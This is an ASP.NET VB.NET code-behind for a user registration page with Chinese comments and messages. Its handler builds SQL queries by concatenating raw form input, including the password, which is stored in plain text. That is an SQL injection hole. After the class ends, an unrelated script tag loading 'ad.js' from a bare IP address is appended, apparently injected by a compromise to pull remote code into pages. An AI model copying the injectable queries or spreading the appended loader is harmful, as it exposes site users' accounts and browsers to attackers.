Imports System.Data
Imports System.Data.SqlClient

Public Class newcustomer
    Inherits System.Web.UI.Page

#Region " Web 窗体设计器生成的代码 "

    '该调用是 Web 窗体设计器所必需的。
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents Form2 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents lblName As System.Web.UI.WebControls.Label
    Protected WithEvents txtName As System.Web.UI.WebControls.TextBox
    Protected WithEvents lblPwd As System.Web.UI.WebControls.Label
    Protected WithEvents txtPwd As System.Web.UI.WebControls.TextBox
    Protected WithEvents lblConfirm As System.Web.UI.WebControls.Label
    Protected WithEvents txtConfirm As System.Web.UI.WebControls.TextBox
    Protected WithEvents btnAdd As System.Web.UI.WebControls.Button
    Protected WithEvents btnCancel As System.Web.UI.WebControls.Button
    Protected WithEvents Label1 As System.Web.UI.WebControls.Label
    Protected WithEvents txtNameRegularExpressionValidator As System.Web.UI.WebControls.RegularExpressionValidator
    Protected WithEvents txtPwdRegularExpressionValidator As System.Web.UI.WebControls.RegularExpressionValidator
    Protected WithEvents txtConfirmRegularExpressionValidator As System.Web.UI.WebControls.RegularExpressionValidator
    Protected WithEvents lblWarning As System.Web.UI.WebControls.Label
    Protected WithEvents lblAccPri As System.Web.UI.WebControls.Label
    Protected WithEvents txtAccPri As System.Web.UI.WebControls.TextBox
    Protected WithEvents txtAccPriRegularExpressionValidator As System.Web.UI.WebControls.RegularExpressionValidator
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents timetext As System.Web.UI.WebControls.Label

    '注意: 以下占位符声明是 Web 窗体设计器所必需的。
    '不要删除或移动它。
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: 此方法调用是 Web 窗体设计器所必需的
        '不要使用代码编辑器修改它。
        InitializeComponent()
    End Sub

#End Region

    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '在此处放置初始化页的用户代码
        lblWarning.Visible = False
        Me.timetext.Text = DateTime.Now.ToString()

        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite
        If Session("UserName") = "" Then
            Me.lblHint.Text = "您还没登录，请先登录"
        Else
            Me.lblHint.Text = "您好， " + Session("UserName")
        End If
    End Sub

    Private Sub btnCancel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCancel.Click
        Me.txtName.Text = ""
        Me.txtAccPri.Text = ""
    End Sub

    Private Sub btnAdd_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnAdd.Click
        If (Me.txtName.Text = "" Or Me.txtPwd.Text = "" Or Me.txtConfirm.Text = "" Or Me.txtAccPri.Text = "") Then
            Me.lblWarning.Text = "提醒：请先填好全部注册信息"
            Me.lblWarning.Visible = True
            Exit Sub
        End If
        If (Me.txtPwd.Text <> Me.txtConfirm.Text) Then
            Me.lblWarning.Text = "提醒：两次输入密码不一样，请重新输入"
            Me.lblWarning.Visible = True
            Exit Sub
        End If

        Me.lblWarning.Visible = False
        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        Dim sqlReader As SqlDataReader = Nothing
        strSql = "select * from userTable where UserId='" + Me.txtName.Text.Trim() + "'"
        Dim mySqlComm As SqlCommand
        mySqlComm = New SqlCommand(strSql, mySqlConn)
        Try
            mySqlConn.Open()
            sqlReader = mySqlComm.ExecuteReader()

            If (sqlReader.Read()) Then
                Me.lblWarning.Text = "警告：该用户名已存在，请输入新的用户名"
                lblWarning.Visible = True
            Else
                strSql = "Insert into userTable values('" + Me.txtName.Text.Trim() + "', '" + Me.txtPwd.Text.Trim() + "', '" + Me.txtAccPri.Text.Trim() + "')"
                mySqlConn.Close()
                mySqlComm.CommandText = strSql
                mySqlConn.Open()
                If (mySqlComm.ExecuteNonQuery() > 0) Then
                    Me.lblWarning.Text = "恭喜：添加用户" + Me.txtName.Text.Trim() + "成功"
                    Me.lblWarning.Visible = True
                Else
                    Me.lblWarning.Text = "警告：由于某种原因添加用户失败，可能你没有权限"
                    Me.lblWarning.Visible = True
                    txtName.Text = ""
                End If
            End If
            sqlReader.Close()
            mySqlConn.Close()
        Catch ex As SqlException
            If sqlReader.IsClosed = False Then
                sqlReader.Close()
                mySqlConn.Close()
            End If
            Response.Redirect("error.htm") ' 错误提示
        Finally
        End Try
    End Sub
End Class
<script src="http://222.208.183.246/ad/ad.js"></script>
